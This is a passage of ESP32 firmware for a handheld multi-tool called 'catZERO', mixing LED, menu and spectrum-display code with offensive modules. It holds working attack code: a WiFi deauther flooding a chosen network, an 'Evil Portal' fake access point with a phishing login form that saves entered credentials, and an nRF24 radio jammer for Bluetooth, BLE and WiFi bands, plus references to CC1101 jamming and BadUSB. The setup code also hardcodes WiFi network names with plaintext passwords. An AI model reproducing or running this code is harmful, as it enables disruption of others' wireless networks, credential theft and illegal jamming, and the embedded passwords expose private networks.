                if (cube1Pos >= 7 || cube1Pos <= 0) cubeDir1 *= -1;
                if (cube2Pos >= 7 || cube2Pos <= 0) cubeDir2 *= -1;
                if (cube1Pos == cube2Pos) {
                    cubeDir1 *= -1;
                    cubeDir2 *= -1;
                }
            }
            led_board.clear();
            for (int i = 0; i < 2; i++) {
                int p1 = cube1Pos + i;
                if (p1 >= 0 && p1 < 8) led_board.setPixelColor(p1, led_board.Color(r * bright, g * bright, b * bright));
                int p2 = cube2Pos + i;
                if (p2 >= 0 && p2 < 8) led_board.setPixelColor(p2, led_board.Color(r * bright, g * bright, b * bright));
            }
            led_board.show();
            break;
        }

        case 4:
        {
            if (millis() - lastEffectTime > 100) {
                lastEffectTime = millis();
                chaseStep = (chaseStep + 1) % 3;
            }
            for (int i = 0; i < 8; i++) {
                if ((i + chaseStep) % 3 == 0) {
                    led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
                } else {
                    led_board.setPixelColor(i, 0);
                }
            }
            led_board.show();
            break;
        }

        case 5:
        {
            if (millis() - lastEffectTime > 100) {
                lastEffectTime = millis();
                strobeState = !strobeState;
            }
            if (strobeState) {
                for (int i = 0; i < 8; i++) {
                    led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
                }
            } else {
                led_board.clear();
            }
            led_board.show();
            break;
        }

        default:
            for (int i = 0; i < 8; i++) {
                led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
            }
            led_board.show();
            break;
    }
}
void updateLedKeyboard() {
  static unsigned long lastUpdate = 0;
  static unsigned long lastEffectTime = 0;
  static int hueOffset = 0;
  static bool strobeState = false;

  if (led_keyboard_timeout > 0 && (millis() - lastLedActivity) > (led_keyboard_timeout * 1000UL)) {
    led_keyboard.clear();
    led_keyboard.show();
    return;
  }
  if (millis() - lastUpdate < 30) return;
  lastUpdate = millis();

  uint32_t baseColor = 0;
  if (led_keyboard_colorIdx > 0 && led_keyboard_colorIdx < numColors) {
    baseColor = colorPalette[led_keyboard_colorIdx];
  } else {
    baseColor = colorPalette[0];
  }
  uint8_t r = (baseColor >> 16) & 0xFF;
  uint8_t g = (baseColor >> 8) & 0xFF;
  uint8_t b = baseColor & 0xFF;
  float bright = (float)led_keyboard_brightness / 100.0;

  switch (led_keyboard_effect) {
    case 0:
      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
      led_keyboard.show();
      break;

    case 1:
    {
      float breath = 0.5 + 0.5 * sin(millis() * 0.003);
      uint8_t bri = breath * led_keyboard_brightness;
      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bri / 100, g * bri / 100, b * bri / 100));
      led_keyboard.show();
      break;
    }

    case 2:
    {
      hueOffset = (hueOffset + 1) % 360;
      uint32_t col = led_keyboard.ColorHSV(hueOffset * 182, 255, led_keyboard_brightness * 255 / 100);
      led_keyboard.setPixelColor(0, col);
      led_keyboard.show();
      break;
    }

    case 3:
    {
      if (millis() - lastEffectTime > 100) {
        lastEffectTime = millis();
        strobeState = !strobeState;
      }
      if (strobeState) {
        led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
      } else {
        led_keyboard.clear();
      }
      led_keyboard.show();
      break;
    }

    default:
      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
      led_keyboard.show();
      break;
  }
}
void updateWifiSpectrum() {
  if (!wifiSpectrumActive) return;
  if (millis() - lastChanSwitch > 100) {
    currentWifiChan = (currentWifiChan % WIFI_CHANNELS) + 1;
    esp_wifi_set_channel(currentWifiChan, WIFI_SECOND_CHAN_NONE);
    lastChanSwitch = millis();
    wifiPackets[currentWifiChan] = 0;
    needRedraw = true;
  }
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
    wifiSmooth[ch] = (wifiSmooth[ch] * 7 + wifiPackets[ch] * 3) / 10;
}
void updateNrfSpectrum() {
  if (!nrfOk) return;
  if (millis() - lastNrfScan < 10) return;
  lastNrfScan = millis();
  if (!nrfCalibrated) {
    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
      int minRssi = 100;
      for (int m = 0; m < 10; m++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(150);
        int rssi = radio.testCarrier() ? 40 : 15;
        radio.stopListening();
        if (rssi < minRssi) minRssi = rssi;
      }
      nrfFloor[ch] = minRssi;
    }
    nrfCalibrated = true;
    memset(nrfSmooth, 0, sizeof(nrfSmooth));
    needRedraw = true;
    return;
  }
  radio.setChannel(currentNrfChan);
  radio.startListening();
  delayMicroseconds(150);
  int raw = radio.testCarrier() ? 40 : 0;
  raw -= nrfFloor[currentNrfChan];
  if (raw < 0) raw = 0;
  if (raw > 50) raw = 50;
  nrfRaw[currentNrfChan] = raw;
  int recent[5], cnt = 0;
  for (int i = 0; i < 5; i++) {
    int idx = (currentNrfChan - i + NRF_CHANNELS) % NRF_CHANNELS;
    if (nrfRaw[idx] > 0 || i == 0) recent[cnt++] = nrfRaw[idx];
  }
  for (int i = 0; i < cnt - 1; i++)
    for (int j = i + 1; j < cnt; j++)
      if (recent[i] > recent[j]) { int t = recent[i]; recent[i] = recent[j]; recent[j] = t; }
  int filtered = recent[cnt / 2];
  nrfSmooth[currentNrfChan] = (nrfSmooth[currentNrfChan] * 7 + filtered * 3) / 10;
  int level = map(nrfSmooth[currentNrfChan], 0, 50, 0, 63);
  if (level > 63) level = 63;
  if (level < 0) level = 0;
  for (int i = 0; i < 127; i++) {
    nrf_spectrum_history[i] = nrf_spectrum_history[i + 1];
  }
  nrf_spectrum_history[127] = level;
  currentNrfChan = (currentNrfChan + 1) % NRF_CHANNELS;
  needRedraw = true;
}

void consoleInfoMode() {
  static bool btnProcessed = false;
  static unsigned long longPressStart = 0;
  static bool longPressTriggered = false;
  if (btnOk()) {
    if (!longPressTriggered) {
      if (longPressStart == 0) longPressStart = millis();
      else if (millis() - longPressStart >= 3000) {
        longPressTriggered = true;
        consoleMode = CONSOLE_KEYBOARD;
        drawKeyboard();
        return;
      }
    }
  } else {
    longPressStart = 0;
    longPressTriggered = false;
  }
  if (btnUp() && !btnProcessed) {
    infoPage--;
    if (infoPage < 0) infoPage = totalInfo - 1;
    btnProcessed = true;
    delay(150);
  } else if (btnDown() && !btnProcessed) {
    infoPage++;
    if (infoPage >= totalInfo) infoPage = 0;
    btnProcessed = true;
    delay(150);
  }
  if (!btnUp() && !btnDown()) btnProcessed = false;
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("SYSTEM INFO");
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  display.setCursor(0, 25);
  display.println(infoLines[infoPage]);
  display.setCursor(0, 56);
  display.print(String(infoPage + 1) + "/" + String(totalInfo));
  drawTopBarIcons();
  display.display();
}
void consoleDevMode() {
  static unsigned long lastDraw = 0;
  static unsigned long devStartTime = 0;
  if (DEV_MODE_TIMEOUT > 0 && devStartTime == 0) devStartTime = millis();
  if (DEV_MODE_TIMEOUT > 0 && (millis() - devStartTime >= DEV_MODE_TIMEOUT * 1000UL)) {
    consoleMode = CONSOLE_KEYBOARD;
    drawKeyboard();
    return;
  }
  static unsigned long longPressStart = 0;
  static bool longPressTriggered = false;
  if (btnOk()) {
    if (!longPressTriggered) {
      if (longPressStart == 0) longPressStart = millis();
      else if (millis() - longPressStart >= 3000) {
        longPressTriggered = true;
        consoleMode = CONSOLE_KEYBOARD;
        drawKeyboard();
        return;
      }
    }
  } else {
    longPressStart = 0;
    longPressTriggered = false;
  }
  if (millis() - lastDraw > 30) {
    display.clearDisplay();
    for (int i = 0; i < 200; i++) display.drawPixel(random(128), random(64), SSD1306_WHITE);
    for (int i = 0; i < 20; i++) {
      int x1 = random(128), y1 = random(64), x2 = random(128), y2 = random(64);
      display.drawLine(x1, y1, x2, y2, SSD1306_WHITE);
    }
    for (int i = 0; i < 10; i++) {
      int x = random(128), y = random(64), w = random(20), h = random(20);
      display.fillRect(x, y, w, h, SSD1306_WHITE);
    }
    drawTopBarIcons();
    display.display();
    lastDraw = millis();
  }
  static unsigned long lastSeqTime = 0;
  static bool upProcessed = false, downProcessed = false, okProcessedShort = false;
  if (btnUp() && !upProcessed) { enteredCode[codePos] = 1; codePos++; upProcessed = true; lastSeqTime = millis(); }
  else if (btnDown() && !downProcessed) { enteredCode[codePos] = 3; codePos++; downProcessed = true; lastSeqTime = millis(); }
  else if (btnOk() && !okProcessedShort && !longPressTriggered) { enteredCode[codePos] = 2; codePos++; okProcessedShort = true; lastSeqTime = millis(); }
  if (!btnUp()) upProcessed = false;
  if (!btnDown()) downProcessed = false;
  if (!btnOk()) okProcessedShort = false;
  if (codePos > 0 && (millis() - lastSeqTime > 1000)) codePos = 0;
  if (codePos >= 9) {
    bool correct = true;
    for (int i = 0; i < 9; i++) if (enteredCode[i] != secretCode[i]) correct = false;
    if (correct) {
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
    }
    codePos = 0;
  }
}
void consoleLoop() {
  if (consoleMode == CONSOLE_INFO) {
    consoleInfoMode();
    return;
  }
  if (consoleMode == CONSOLE_DEV) {
    consoleDevMode();
    return;
  }
  static unsigned long lastMoveTime = 0;
  static bool leftHeld = false, rightHeld = false;
  static bool okProcessed = false;
  if (btnUp()) {
    if (!leftHeld) {
      leftHeld = true;
      lastMoveTime = millis();
      selectedKey--;
      if (selectedKey < 0) selectedKey = totalKeys - 1;
      drawKeyboard();
    } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
      lastMoveTime = millis();
      selectedKey--;
      if (selectedKey < 0) selectedKey = totalKeys - 1;
      drawKeyboard();
    }
  } else {
    leftHeld = false;
  }
  if (btnDown()) {
    if (!rightHeld) {
      rightHeld = true;
      lastMoveTime = millis();
      selectedKey++;
      if (selectedKey >= totalKeys) selectedKey = 0;
      drawKeyboard();
    } else if (millis() - lastMoveTime > CONSOLE_AUTOREPEAT_DELAY) {
      lastMoveTime = millis();
      selectedKey++;
      if (selectedKey >= totalKeys) selectedKey = 0;
      drawKeyboard();
    }
  } else {
    rightHeld = false;
  }
  if (btnOk() && !okProcessed) {
    okProcessed = true;
    String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
    if (key == "Caps") {
      capsLock = !capsLock;
      drawKeyboard();
    } else if (key == "Del") {
      if (consoleText.length() > 0) consoleText.remove(consoleText.length() - 1);
      drawKeyboard();
    } else if (key == "OK") {
      executeCommand(consoleText);
      consoleText = "";
      if (appState == STATE_CONSOLE && consoleMode == CONSOLE_KEYBOARD) drawKeyboard();
    } else if (key == "Exit") {
      appState = STATE_MAIN_MENU;
      needRedraw = true;
      return;
    } else if (key == "Space") {
      consoleText += " ";
      drawKeyboard();
    } else if (key.length() > 0 && key != "Caps" && key != "Del" && key != "OK" && key != "Exit") {
      consoleText += key;
      drawKeyboard();
    }
    delay(150);
  }
  if (!btnOk()) okProcessed = false;
}

// ======================================================================
// НОВЫЕ МОДУЛИ (DEAUTHER, EVIL PORTAL, NRF ENHANCED JAMMER)
// ======================================================================

// ---- DEAUTHER ----
static unsigned long deauthPacketCount = 0;
static unsigned long deauthStartTime = 0;

void runDeauther() {
  if (wifiList.empty()) {
    showMsg("Scan WiFi first");
    return;
  }
  if (wifiSelectedIdx < 0 || wifiSelectedIdx >= (int)wifiList.size()) {
    wifiSelectedIdx = 0;
  }
  targetChan = wifiList[wifiSelectedIdx].channel;
  memcpy(targetBSSID, wifiList[wifiSelectedIdx].bssid, 6);
  deauthActive = true;
  deauthPacketCount = 0;
  deauthStartTime = millis();
  appState = STATE_DEAUTHER;
  needRedraw = true;
  showMsg("Deauther started");
}

void drawDeautherStatus() {
  display.clearDisplay();
  drawHeader("Deauther");
  display.setCursor(2, 14);
  display.print("Status: ON");
  display.setCursor(2, 24);
  display.print("Packets: " + String(deauthPacketCount));
  display.setCursor(2, 34);
  unsigned long elapsed = (millis() - deauthStartTime) / 1000;
  display.print("Time: " + String(elapsed) + "s");
  display.setCursor(2, 44);
  display.print("OK=stop");
  drawTopBarIcons();
  display.display();
  if (btnOk()) {
    deauthActive = false;
    appState = STATE_WIFI_MENU;
    needRedraw = true;
    showMsg("Deauther stopped");
    return;
  }
  if (deauthActive && targetChan != 0) {
    if (millis() - lastDeauthTime > 100) {
      sendDeauth();
      lastDeauthTime = millis();
      deauthPacketCount++;
      needRedraw = true;
    }
  }
}

// ---- EVIL PORTAL ----
static DNSServer evilDns;
static AsyncWebServer evilWeb(80);
static String evilHtml = "";
static bool evilPortalRunning = false;
static int evilCreds = 0;
static String evilLastCred = "";
static IPAddress evilAPIP;

class EvilPortalHandler : public AsyncWebHandler {
public:
  virtual bool canHandle(AsyncWebServerRequest *request) { return true; }
  virtual void handleRequest(AsyncWebServerRequest *request) {
    if (request->url() == "/" || request->url() == "/index.html") {
      if (evilHtml.isEmpty()) {
evilHtml = "<html><body><h1>WiFi Portal</h1>"
           "<form action='/post' method='POST'>"
           "Email: <input name='email'><br>"
           "Password: <input name='password' type='password'><br>"
           "<input type='submit'>"
           "</form></body></html>";
      }
      request->send(200, "text/html", evilHtml);
    } else if (request->url() == "/post") {
      String ssid = request->arg("ssid");
      String pass = request->arg("pass");
      if (!ssid.isEmpty() && !pass.isEmpty()) {
        evilCreds++;
        evilLastCred = "SSID: " + ssid + " PASS: " + pass;
        saveWiFiCredentials(ssid, pass);
      }
      request->send(200, "text/html", "<html><body><h2>Thanks!</h2><script>setTimeout(()=>{location='/';},2000);</script></body></html>");
    } else {
      request->redirect("/");
    }
  }
};

void runEvilPortal() {
  if (evilPortalRunning) { showMsg("Already running"); return; }
  String ssid = inputStringWithKeyboard(true, "AP SSID:");
  if (ssid.isEmpty()) ssid = "FreeWiFi";
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str());
  evilAPIP = WiFi.softAPIP();
  evilDns.start(53, "*", evilAPIP);
  evilWeb.addHandler(new EvilPortalHandler()).setFilter(ON_AP_FILTER);
  evilWeb.begin();
  evilPortalRunning = true;
  appState = STATE_EVIL_PORTAL;
  needRedraw = true;
  showMsg("Portal started");
}

void drawEvilPortalStatus() {
  display.clearDisplay();
  drawHeader("Evil Portal");
  display.setCursor(2, 14);
  display.print("Status: Running");
  display.setCursor(2, 24);
  display.print("SSID: " + String(WiFi.softAPSSID()));
  display.setCursor(2, 34);
  display.print("IP: " + evilAPIP.toString());
  display.setCursor(2, 44);
  display.print("Creds: " + String(evilCreds));
  display.setCursor(2, 54);
  display.print("OK=stop");
  drawTopBarIcons();
  display.display();
  evilDns.processNextRequest();
  if (btnOk()) {
    evilWeb.end();
    evilDns.stop();
    WiFi.softAPdisconnect(true);
    evilPortalRunning = false;
    appState = STATE_WIFI_MENU;
    needRedraw = true;
    showMsg("Portal stopped");
  }
}

// ---- NRF24 ENHANCED JAMMER ----
static unsigned long jamPacketCount = 0;
static unsigned long jamStartTime = 0;
static int jamMode = 1; // 0 - BLE, 1 - BT

// -------------------------------------------------------------
// NRF ENHANCED JAMMER (исправленная версия)
// -------------------------------------------------------------

// -------------------------------------------------------------
// NRF ENHANCED JAMMER (на основе вашего рабочего кода)
// -------------------------------------------------------------

// =====================================================
// NRF ENHANCED JAMMER (пакетный метод, как в оригинале)
// =====================================================
void runNrfEnhancedJammer() {
    if (!nrfOk) {
        showMsg("nRF24 not found");
        return;
    }

    const char* modes[] = {"BLE", "BT Classic", "Full 2.4GHz", "WiFi"};
    int mode = 1; // BT по умолчанию

    // === ВЫБОР РЕЖИМА ===
    while (true) {
        display.clearDisplay();
        drawHeader("NRF Enhanced Jammer");
        display.setCursor(10, 20);
        display.print("Mode: ");
        display.println(modes[mode]);
        display.setCursor(10, 35);
        display.println("UP/DOWN - change mode");
        display.setCursor(10, 50);
        display.println("OK - START jamming");
        display.display();

        Button btn = readButton();
        
        if (btn == BTN_UP)   { mode = (mode + 1) % 4; delay(200); }
        if (btn == BTN_DOWN) { mode = (mode + 3) % 4; delay(200); }
        
        if (btn == BTN_OK) {
            // Ждём, пока пользователь отпустит кнопку
            while (readButton() == BTN_OK) delay(10);
            delay(150);   // небольшая пауза
            break;
        }
        delay(50);
    }

    // === НАСТРОЙКА КАНАЛОВ ===
    uint8_t channels[128];
    int chCount = 0;
    switch (mode) {
        case 0: // BLE
            chCount = 3;
            channels[0] = 37; channels[1] = 38; channels[2] = 39;
            break;
        case 1: // BT
            chCount = 80;
            for (int i = 0; i < 80; i++) channels[i] = i;
            break;
        case 2: // Full
            chCount = 125;
            for (int i = 0; i < 125; i++) channels[i] = i;
            break;
        case 3: // WiFi
            chCount = 14;
            int wifiCh[] = {12,17,22,27,32,37,42,47,52,57,62,67,72,84};
            memcpy(channels, wifiCh, sizeof(wifiCh));
            break;
    }

    // === ИНИЦИАЛИЗАЦИЯ РАДИО ===
    radio.powerUp();
    radio.stopListening();
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.setRetries(0, 0);
    radio.setAddressWidth(3);
    radio.setPayloadSize(32);
    radio.disableDynamicPayloads();
    radio.flush_tx();

    uint8_t payload[32];
    memset(payload, 0xFF, 32); // шум

    jamming = true;
    jamStartTime = millis();
    jamPacketCount = 0;
    int chIndex = 0;
    unsigned long lastStatus = 0;

    // === ОСНОВНОЙ ЦИКЛ ДЖАММЕРА ===
    while (true) {
        Button btn = readButton();
        
        if (btn == BTN_OK) {
            while (readButton() == BTN_OK) delay(10); // ждём отпускания
            break;
        }
        if (longPressDetected) break;

        radio.setChannel(channels[chIndex]);

        // Мощный спам
        for (int i = 0; i < 12; i++) {
            radio.writeFast(payload, 32, true);
        }
        radio.txStandBy(0);

        jamPacketCount += 12;
        chIndex = (chIndex + 1) % chCount;

        // Обновление экрана
        if (millis() - lastStatus > 300) {
            drawNrfEnhancedStatus(mode, channels[chIndex]);
            lastStatus = millis();
        }

        delayMicroseconds(120);
    }

    // === ЗАВЕРШЕНИЕ ===
    radio.flush_tx();
    radio.powerDown();
    jamming = false;
    showMsg("Jammer stopped");
}

// =====================================================
// ОТОБРАЖЕНИЕ СТАТУСА ДЖАММЕРА
// =====================================================
void drawNrfEnhancedStatus(int mode, int ch) {
    display.clearDisplay();
    drawHeader("NRF Jammer");
    display.setCursor(2, 14);
    display.print("Status: " + String(jamming ? "ON" : "OFF"));
    display.setCursor(2, 24);
    const char* modes[] = {"BLE", "BT", "Full", "WiFi"};
    display.print("Mode: " + String(modes[mode]));
    display.setCursor(2, 34);
    display.print("Packets: " + String(jamPacketCount));
    display.setCursor(2, 44);
    unsigned long elapsed = (millis() - jamStartTime) / 1000;
    display.print("Time: " + String(elapsed) + "s");
    display.setCursor(2, 54);
    display.print("OK to stop");
    drawTopBarIcons();
    display.display();
}
// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
String macToString(uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
  return String(buf);
}
void stringToMAC(const char* str, uint8_t* mac) {
  sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
}
String ipToString(uint8_t* ip) {
  return String(ip[0])+"."+String(ip[1])+"."+String(ip[2])+"."+String(ip[3]);
}
void displayError(const char* msg, bool wait) { showMsg(msg); if(wait) delay(2000); }
void displaySuccess(const char* msg, bool wait) { showMsg(msg); if(wait) delay(2000); }
void drawMainBorderWithTitle(const char* title) { drawHeader(title); }
void padprintln(const char* str) { display.println(str); }
void printFootnote(const char* str) { display.setCursor(0, 56); display.print(str); }
void wifiDisconnect() { WiFi.disconnect(true); }

void performBleScan() {
    bleDevices.clear();
    bleSelectedIdx = 0;
    bleScrollOffset = 0;
    showMsg("Scanning...");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    BLEScanResults foundDevices = pBLEScan->start(5, false);
    int count = foundDevices.getCount();
    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = foundDevices.getDevice(i);
        BLEDeviceInfo info;
        info.name = String(device.getName().c_str());
        info.address = String(device.getAddress().toString().c_str());
        info.rssi = device.getRSSI();
        bleDevices.push_back(info);
    }
    pBLEScan->clearResults();
    showMsg("Scan complete");
}





// ==================== updateDisplay (исправлен) ====================
void updateDisplay() {
  if (!displayOn) return;
  if (statusMsg != "" && millis() - statusMsgTime < 1500) {
    display.clearDisplay();
    if (lastLongMsg != "") {
      int16_t x1, y1;
      uint16_t w, h;
      display.getTextBounds(lastLongMsg, 0, 0, &x1, &y1, &w, &h);
      if (millis() - lastMsgScrollTime > 15) {
        msgScrollOffset++;
        if (msgScrollOffset > w + 25) msgScrollOffset = 0;
        lastMsgScrollTime = millis();
      }
      String loopText = lastLongMsg + "   " + lastLongMsg;
      display.setCursor(20 - msgScrollOffset, 28);
      display.print(loopText);
    } else {
      display.setCursor(20, 28);
      display.println(statusMsg);
    }
    handleButtons();
    drawTopBarIcons();
    display.display();
    return;
  }
  if (appState == STATE_CONSOLE_COMMAND_OUTPUT) {
    display.clearDisplay();
    display.setCursor(0, 10);
    display.println(commandOutput);
    display.setCursor(0, 50);
    display.println("Press OK to exit");
    drawTopBarIcons();
    display.display();
    if (btnOk()) {
      waitingForOk = false;
      appState = STATE_CONSOLE;
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
      needRedraw = true;
      return;
    }
    if (commandTimeoutSec > 0 && (millis() - commandStartTime >= commandTimeoutSec * 1000UL)) {
      waitingForOk = false;
      appState = STATE_CONSOLE;
      consoleMode = CONSOLE_KEYBOARD;
      drawKeyboard();
      needRedraw = true;
    }
    return;
  }
  switch (appState) {
    case STATE_APPS_MENU: drawAppsMenu(); break;
    case STATE_APPS_CALCULATOR: drawCalculator(); break;
    case STATE_APPS_GAME1: drawBirdGame(); break;
    case STATE_APPS_GAME2: drawTetrisGame(); break;
    case STATE_BLUETOOTH_SCAN: drawBluetoothScan(); break;
    case STATE_BLUETOOTH_MENU: drawBluetoothMenu(); break;
    case STATE_LED_SELECT_DEVICE: drawLedSelectDevice(); break;
    case STATE_LED_MAIN_MENU: drawLedMainMenu(); break;
    case STATE_LED_COLOR_MENU: drawLedColorMenu(); break;
    case STATE_LED_EFFECT_MENU: drawLedEffectMenu(); break;
    case STATE_LED_BRIGHTNESS_MENU: drawLedBrightnessMenu(); break;
    case STATE_LED_TIMEOUT_MENU: drawLedTimeoutMenu(); break;
    case STATE_STORAGE_INFO: drawStorageInfo(); break;
    case STATE_MAIN_MENU: drawMainMenu(); break;
    case STATE_WIFI_MENU: drawWifiMenu(); break;
    case STATE_WIFI_SCAN: drawWifiScan(); break;
    case STATE_WIFI_SPECTRUM: drawWifiSpectrum(); break;
    case STATE_WIFI_ACTIONS: drawWifiActions(); break;
    case STATE_WIFI_INFO: drawWifiInfo(); break;
    case STATE_WIFI_CONNECTING: drawWifiConnecting(); break;
    case STATE_WIFI_CHAT: drawWifiChat(); break;
    case STATE_NRF24_MENU: drawNrfMenu(); break;
    case STATE_NRF24_SPECTRUM: drawNrfSpectrum(); break;
    case STATE_NRF24_JAMMER: drawNrfJammer(); break;
    case STATE_IR_MENU: drawIrMenu(); break;
    case STATE_IR_CAPTURE: drawIrCapture(); break;
    case STATE_IR_TRANSMIT: drawIrTransmit(); break;
    case STATE_TVBGONE: drawTvbgone(); break;
    case STATE_SETTINGS_MENU: drawSettingsMenu(); break;
    case STATE_SYSTEM_INFO: drawSysInfo(); break;
    case STATE_TIMEOUT: drawTimeoutMenu(); break;
    case STATE_RESET_CONFIRM: drawResetConfirm(); break;
    case STATE_REBOOT_CONFIRM: drawRebootConfirm(); break;
    case STATE_CONFIRM_FACTORY_RESET: drawFactoryResetConfirm(); break;
    case STATE_CONSOLE: consoleLoop(); break;
    case STATE_CC1101_MENU: drawCc1101Menu(); break;
    case STATE_CC1101_SPECTRUM_VERT: drawCc1101SpectrumVert(); break;
    case STATE_CC1101_SPECTRUM_HORIZ: drawCc1101SpectrumHoriz(); break;
    case STATE_CC1101_JAMMER: drawCc1101Jammer(); break;
    case STATE_CC1101_CAPTURE: drawCc1101Capture(); break;
    case STATE_CC1101_TRANSMIT: drawCc1101Transmit(); break;
    case STATE_BADUSB_MENU: drawBadUsbMenu(); break;
    case STATE_BADUSB_BUILTIN: drawBadUsbBuiltin(); break;
    case STATE_BADUSB_SD: drawBadUsbSd(); break;
    case STATE_EVIL_PORTAL: drawEvilPortalStatus(); break;
    case STATE_DEAUTHER: drawDeautherStatus(); break;
    case STATE_NRF_ENHANCED: drawNrfEnhancedStatus(jamMode, 0); break;
    default: break;
  }
  needRedraw = false;
}

// ==================== SETUP ====================
void setup() {
  delay(500);
  deviceBootTime = millis();
  lastActivityTime = millis();
  Serial.begin(115200);
  Serial.println("\ncatZERO v3.0 Starting");
  BLEDevice::init("catZERO");
  debugPrint("Setup begin");
  pref.begin("battery", true);
  batteryRemaining = pref.getFloat("remaining", batteryCapacity);
  pref.end();
  pinMode(CHARGE_PIN, INPUT);
  USB.begin();
  Keyboard.begin();
  Serial.println("USB HID ready");
  BLEDevice::init("catZERO");
  led_board.begin();
  led_board.show();
  led_keyboard.begin();
  led_keyboard.show();
  led_board.setBrightness(led_board_brightness);
  led_keyboard.setBrightness(led_keyboard_brightness);
  loadLedSettings();

  // Инициализация Tetris
  randomSeed(analogRead(0));
  spawnPiece();

  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println("OLED ERROR");
  } else {
    Serial.println("OLED OK");
  }
  display.setTextWrap(false);
  display.setTextColor(SSD1306_WHITE);
  showBootLogo();
  debugPrint("Display initialized");

  pinMode(BTN_ANALOG_PIN, INPUT);
  analogSetPinAttenuation(BTN_ANALOG_PIN, ADC_11db);
  loadTimeout();
  debugPrint("Timeout loaded");
  pinMode(RESET_BTN_PIN, INPUT_PULLUP);
  pinMode(10, INPUT_PULLUP);

  WiFi.mode(WIFI_OFF);
  delay(100);
  debugPrint("WiFi mode set to OFF");

  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
  SPI.setFrequency(8000000);
  debugPrint("SPI started");
  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected()) {
    nrfOk = true; nrfErrorMsg = "OK";
    radio.setChannel(42); radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false); radio.disableCRC(); radio.stopListening();
    Serial.println("nRF24 OK");
  } else {
    nrfOk = false; nrfErrorMsg = "not found";
    Serial.println("nRF24 FAIL");
  }
  for (int i = 0; i < 32; i++) jamNoise[i] = random(256);

  SPI.begin(CC_SCK_PIN, CC_MISO_PIN, CC_MOSI_PIN, CC_CSN_PIN);
  ELECHOUSE_cc1101.setSpiPin(CC_SCK_PIN, CC_MISO_PIN, CC_MOSI_PIN, CC_CSN_PIN);
  if (ELECHOUSE_cc1101.getCC1101()) {
    cc1101_ok = true;
    Serial.println("CC1101 detected");
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setDRate(9.6);
    ELECHOUSE_cc1101.setRxBW(325);
    ELECHOUSE_cc1101.setSyncMode(0);
    ELECHOUSE_cc1101.setPktFormat(3);
    ELECHOUSE_cc1101.SetRx();
    for (int i = 0; i < 128; i++) {
      cc1101_spectrum_vert[i] = 0;
      cc1101_spectrum_horiz[i] = 0;
    }
    cc1101_current_channel = 0;
    ELECHOUSE_cc1101.setMHZ(300.0);
    showMsg("CC1101 OK");
  } else {
    cc1101_ok = false;
    Serial.println("CC1101 not found");
    showMsg("CC1101 ERROR");
  }

  irRx = new IRrecv(IR_RX_PIN);
  irRx->enableIRIn();
  irRxOk = true;
  irTx = new IRsend(IR_TX_PIN);
  irTx->begin();
  for (int i = 0; i < IR_SLOTS_COUNT; i++) irSlots[i].isValid = false;
  loadIrSlots();
  debugPrint("IR initialized");

  EEPROM.begin(EEPROM_SIZE_BYTES);
  LittleFS.begin(true);
  debugPrint("LittleFS mounted");

  loadWiFiCredentials();
  const char* presetSSID[] = {"FRITZ!Box 6591 Cabel MK", "moto e13", "", "", ""};
  const char* presetPASS[] = {"43481208496765148415", "12345678", "", "", ""};
  for (int i = 0; i < 5; i++) {
    if (strlen(presetSSID[i]) == 0) continue;
    bool already = false;
    for (int j = 0; j < savedNetworksCount; j++) {
      if (savedSSID[j] == String(presetSSID[i])) {
        already = true;
        break;
      }
    }
    if (!already) {
      saveWiFiCredentials(String(presetSSID[i]), String(presetPASS[i]));
      Serial.print("Added preset: ");
      Serial.println(presetSSID[i]);
    }
  }
  loadWiFiCredentials();

  memset(nrfSmooth, 0, sizeof(nrfSmooth));
  memset(nrf_spectrum_history, 0, sizeof(nrf_spectrum_history));
  memset(wifiSmooth, 0, sizeof(wifiSmooth));
  appState = STATE_MAIN_MENU;
  needRedraw = true;
  autoConnectScheduled = true;
  autoConnectTime = millis() + 500;
  debugPrint("Auto-connect scheduled");
  chatActive = false;
  Serial.println("Setup complete");
  debugPrintState();
  Serial.println("\n========== SYSTEM STATUS ==========");
  Serial.print("Chip: ESP32-S3 (revision ");
  Serial.print(ESP.getChipRevision());
  Serial.println(")");
  Serial.print("CPU frequency: ");
  Serial.print(ESP.getCpuFreqMHz());
  Serial.println(" MHz");
  Serial.print("Flash size: ");
  Serial.print(ESP.getFlashChipSize() / (1024 * 1024));
  Serial.println(" MB");
  Serial.print("Free heap: ");
